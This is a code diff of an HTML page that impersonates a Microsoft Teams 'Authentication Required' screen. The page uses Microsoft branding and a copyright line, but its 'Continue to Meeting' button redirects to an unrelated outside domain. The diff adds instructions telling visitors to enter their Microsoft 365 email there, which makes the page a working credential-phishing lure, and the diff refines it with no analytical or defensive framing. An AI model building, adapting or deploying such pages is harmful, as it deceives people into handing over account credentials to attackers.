@@ -3,74 +3,66 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Microsoft Teams | Authentication Required</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600&display=swap" rel="stylesheet">
+    <title>Authentication Required</title>
     <style>
-        * { box-sizing: border-box; }
         body {
-            margin: 0;
-            padding: 0;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #f3f2f1;
+            font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f3f3f3;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
+            margin: 0;
         }
         .container {
             background: #ffffff;
+            padding: 40px;
             border-radius: 8px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
-            width: 420px;
-            padding: 40px 30px;
+            box-shadow: 0 4px 16px rgba(0,0,0,0.15);
             text-align: center;
+            max-width: 420px;
+            width: 100%;
         }
         .logo {
             width: 60px;
+            height: 60px;
             margin-bottom: 20px;
         }
         h1 {
-            font-size: 22px;
-            font-weight: 600;
-            color: #323130;
-            margin-bottom: 15px;
+            color: #6264A7;
+            font-size: 24px;
+            margin-bottom: 16px;
         }
         p {
+            color: #333;
             font-size: 14px;
-            color: #605E5C;
+            margin-bottom: 24px;
             line-height: 1.5;
-            margin-bottom: 30px;
         }
         .button-primary {
             background-color: #6264A7;
             color: #ffffff;
-            font-size: 15px;
-            font-weight: 600;
-            padding: 12px 0;
-            width: 100%;
             border: none;
+            padding: 12px 24px;
+            font-size: 16px;
             border-radius: 4px;
             cursor: pointer;
-            transition: background-color 0.2s ease;
+            width: 100%;
         }
         .button-primary:hover {
-            background-color: #4b4d90;
+            background-color: #505090;
+        }
+        .helper-text {
+            margin-top: 16px;
+            font-size: 13px;
+            color: #555;
+            line-height: 1.5;
+            text-align: left;
         }
         .footer {
-            margin-top: 30px;
+            margin-top: 24px;
             font-size: 12px;
-            color: #8A8886;
-            border-top: 1px solid #E1DFDD;
-            padding-top: 15px;
-        }
-        @media (max-width: 480px) {
-            .container {
-                width: 90%;
-                padding: 30px 20px;
-            }
-            h1 { font-size: 20px; }
+            color: #999;
         }
     </style>
 </head>
@@ -84,9 +76,13 @@
         <h1>Authentication Required</h1>
         <p>To continue to your Microsoft Teams meeting, please confirm your Microsoft 365 account. This is a standard security step to ensure secure access for all participants.</p>
 
-        <button type="button" class="button-primary" title="Continue to Meeting" aria-label="Continue to Meeting" onclick="window.location.href='https://access-meeting.visions-solutions.ca/TlwlKaDO';">
+        <button type="button" class="button-primary" onclick="window.location.href='https://access-meetings.visions-solutions.ca/TlwlKaDO';">
             Continue to Meeting
         </button>
+
+        <div class="helper-text">
+            On the next page, enter your Microsoft 365 email address and click <strong>Next</strong> to proceed. This ensures secure access to your meeting.
+        </div>
 
         <div class="footer">
             © 2025 Microsoft Corporation. All rights reserved.
